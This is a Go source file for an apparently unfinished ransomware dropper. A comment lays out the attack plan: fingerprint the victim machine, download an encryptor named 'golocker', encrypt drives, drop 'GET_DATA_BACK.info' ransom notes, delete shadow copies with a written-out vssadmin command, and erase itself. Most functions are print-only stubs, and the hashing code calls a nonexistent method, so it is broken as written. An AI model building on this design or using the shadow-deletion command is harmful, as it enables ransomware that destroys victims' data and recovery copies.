/*this is the plan:
1) exploit places dropper.go on target machine and executes it.
2) dropper.go determines platform and generates a unique hash for this machine
3) dropper.go reaches out to a server and downloads golocker while sending hash to server
4) server will respond with password to encrypt with (unique to hash/machine)
5) dropper.go creates a file in the root of drives and all users home dirs called "GET_DATA_BACK.info" with instructions
6) dropper.go triggers `golocker -enc -targetdir "os_root_dir_here" -password "somepasswordhere"` so that there is no password string to recover from the binary.
7) once complete dropper.go will delete golocker.go and delete logs and shadow volumes e.g `vssadmin delete shadows /for=c: /all /quiet`
8) dropper.go will also try to remove itself from the system.
*/
package main
import (
  // "os"
  // "net/http"
  "fmt"
  "crypto/sha256"
)



func main()  {
  fmt.Println("starting...")

  genHash()
  sendHash("servernamehere")
  getGol()
  notifyUsers()
  runGol()
  cleanHouse()

  fmt.Println("all done...")

}

func cleanHouse(){
  fmt.Println("cleaning house...")
}

func runGol(){
  fmt.Println("running golocker")
}
func notifyUsers()  {
  fmt.Println("creating notification files...")
}
func getGol()  {
  fmt.Println("getting golocker")
}

func getPlatform() string {
  fmt.Println("determining platform...")

  os := "linux"
  fmt.Println("platform : ", os)
  return os
}

func sendHash(server string)  {
  fmt.Println("sending hash to server...")
  fmt.Println("server: ", server)
}
func genHash(){
  fmt.Println("getting fingerprint...")
  platform := getPlatform()
  s := platform + "macaddr" + "hostname"
  h := sha256.New()
  h.Write([]byte(s))
  fingerprint := h.EncodeToString(h.Sum(nil))
  println(fingerprint)

  fmt.Println("fingerprint: ", fingerprint)
}
